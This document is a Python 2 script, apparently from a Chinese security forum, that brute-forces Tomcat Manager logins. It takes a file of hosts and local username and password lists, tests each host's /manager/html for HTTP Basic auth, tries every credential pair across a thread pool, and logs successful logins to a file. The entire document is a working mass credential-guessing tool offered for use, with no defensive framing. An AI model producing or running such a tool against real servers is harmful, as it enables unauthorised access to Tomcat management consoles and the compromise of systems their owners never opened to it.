# coding:utf-8
# author:Kav
'''
https://www.t00ls.net/thread-44023-1-1.html
脚本是加载当前目录下的 username.txt 和 password.txt 当作用户密码的。    
Uage: python Tomcat_Crack.py URLS.txt 100
脚本存在一点问题：按下Ctrl+c后要过一会才会停下来，用的signal这模块来控制的。
'''


import requests
import base64
from sys import argv
import sys
import signal

username = []
password = []
ips = []


def func_username():
    um = open('username.txt','r')
    for u in um.readlines():
        username.append(u.strip())
    um.close()

def func_password():
    pw = open("password.txt",'r')
    for p in pw.readlines():
        password.append(p.strip())
    pw.close()


def file():
    file  = open(argv[1]).readlines()
    for f in file:
        ips.append(f.strip())


def quit(signum, frame):
    print '\n\n You choose to stop me!!'
    sys.exit(1)


def _401(host):
    _headers = {'User-agent':'Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0'}
    try:
        response = requests.get(host,timeout=5,headers=_headers)
        if response.status_code == 401:
            return True
    except Exception,e:
        return False




def Crack(host):

    URL = "http://"+host+"/manager/html"
    print "\n[+] Cracking ===> "+URL
    if _401(URL):
        for u in username:
            for p in password:
                try:

                    headers = {'Authorization': 'Basic %s==' % (base64.b64encode(u+':'+p))}
                    html  = requests.get(URL,timeout=5,headers=headers)

                    if html.status_code == 200 and "Tomcat"  in html.content:
                        with open("Good.txt",'a') as f:
                            f.write(URL+"   "+u+" || "+p+"\n")
                            break
                    elif html.status_code == 200 and "Tomcat" not in html.content:
                        with open("Good.txt",'a') as f:
                            f.write("Maybe --> "+URL+"   "+u+" || "+p+"\n")


                except Exception,e:
                    pass
    else:
        pass


def main():
    import threadpool

    func_username()
    func_password()
    file()
    pool = threadpool.ThreadPool(int(argv[2]))
    rs = threadpool.makeRequests(Crack, ips)
    [pool.putRequest(req) for req in rs]
    signal.signal(signal.SIGINT, quit)
    pool.wait()

if __name__ == '__main__':
    if len(argv) != 3:
        print("{} <ip_file> <Thread_num>".format(argv[0]))
        sys.exit(1)
    else:
        main()